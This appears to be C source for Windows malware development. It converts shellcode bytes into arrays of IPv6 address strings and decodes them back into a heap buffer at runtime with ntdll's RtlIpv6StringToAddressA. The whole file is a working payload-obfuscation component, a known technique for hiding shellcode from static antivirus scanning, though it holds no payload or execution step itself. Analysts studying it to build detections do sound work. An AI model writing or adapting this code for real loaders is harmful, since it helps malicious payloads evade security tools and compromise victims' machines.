#include <stdio.h>
#include <windows.h>

char* GenerateIpv6(int a, int b, int c, int d, int e, int f, int g, int h, int i, int j, int k, int l, int m, int n, int o, int p) {
	char Output0[32], Output1[32], Output2[32], Output3[32];
	static char result[128];

	// Generating output0 using the first 4 bytes
	sprintf_s(Output0, sizeof(Output0), "%0.2X%0.2X:%0.2X%0.2X", a, b, c, d);

	// Generating output1 using the second 4 bytes
	sprintf_s(Output1, sizeof(Output1), "%0.2X%0.2X:%0.2X%0.2X", e, f, g, h);

	// Generating output2 using the third 4 bytes
	sprintf_s(Output2, sizeof(Output2), "%0.2X%0.2X:%0.2X%0.2X", i, j, k, l);

	// Generating output3 using the last 4 bytes
	sprintf_s(Output3, sizeof(Output3), "%0.2X%0.2X:%0.2X%0.2X", m, n, o, p);

	// Combining Output0,1,2,3 to generate the IPv6 address
	sprintf_s(result, sizeof(result), "%s:%s:%s:%s", Output0, Output1, Output2, Output3);

	// Optional: Print the 'result' variable to the console
	// printf("[i] result: %s\n", (char*)result);

	return result;
}

BOOL GenerateIpv6Output(unsigned char* pShellcode, SIZE_T sShellcode) {
	if (pShellcode == NULL || sShellcode == 0 || sShellcode % 16 != 0) {
		return FALSE;
	}
	printf("char* IPv6Array[%d]: \n", sShellcode / 16);

	int c = 16, counter = 0;
	char* IP = NULL;

	for (int i = 0; i < sShellcode; i++) {
		if (c == 16) {
			counter++;

			IP = GenerateIpv6(pShellcode[i], pShellcode[i + 1], pShellcode[i + 2], pShellcode[i + 3],
				pShellcode[i + 4], pShellcode[i + 5], pShellcode[i + 6], pShellcode[i + 7],
				pShellcode[i + 8], pShellcode[i + 9], pShellcode[i + 10], pShellcode[i + 11],
				pShellcode[i + 12], pShellcode[i + 13], pShellcode[i + 14], pShellcode[i + 15]);
			if (i == sShellcode - 16) {
				printf("\t\"%s\"\n", IP);
				break;
			}
			else {
				printf("\t\"%s\",\n", IP);
			}
			c = 1;
		}
		else {
			c++;
		}
	}
	printf("\n};\n\n");
	return TRUE;
}

typedef NTSTATUS(NTAPI* fnRtlIpv6StringToAddressA)(
	PCSTR		S,
	PCSTR* Terminator,
	PVOID		Addr
	);

BOOL Ipv6Deobfuscation(IN CHAR* Ipv6Array[], IN SIZE_T NmbrOfElements, OUT PBYTE* ppDAddress, OUT SIZE_T* pDSize) {

	PBYTE           pBuffer = NULL,
		TmpBuffer = NULL;

	SIZE_T          sBuffSize = NULL;

	PCSTR           Terminator = NULL;

	NTSTATUS        STATUS = NULL;

	// Getting RtlIpv6StringToAddressA address from ntdll.dll
	fnRtlIpv6StringToAddressA pRtlIpv6StringToAddressA = (fnRtlIpv6StringToAddressA)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "RtlIpv6StringToAddressA");
	if (pRtlIpv6StringToAddressA == NULL) {
		printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Getting the real size of the shellcode which is the number of IPv6 addresses * 16
	sBuffSize = NmbrOfElements * 16;


	// Allocating memory which will hold the deobfuscated shellcode
	pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, sBuffSize);
	if (pBuffer == NULL) {
		printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	TmpBuffer = pBuffer;

	// Loop through all the IPv6 addresses saved in Ipv6Array
	for (int i = 0; i < NmbrOfElements; i++) {

		// Deobfuscating one IPv6 address at a time
		// Ipv6Array[i] is a single IPv6 address from the array Ipv6Array
		if ((STATUS = pRtlIpv6StringToAddressA(Ipv6Array[i], &Terminator, TmpBuffer)) != 0x0) {
			// if it failed
			printf("[!] RtlIpv6StringToAddressA Failed At [%s] With Error 0x%0.8X", Ipv6Array[i], STATUS);
			return FALSE;
		}

		// 16 bytes are written to TmpBuffer at a time
		// Therefore Tmpbuffer will be incremented by 16 to store the upcoming 16 bytes
		TmpBuffer = (PBYTE)(TmpBuffer + 16);

	}

	// Save the base address & size of the deobfuscated payload
	*ppDAddress = pBuffer;
	*pDSize = sBuffSize;

	return TRUE;

}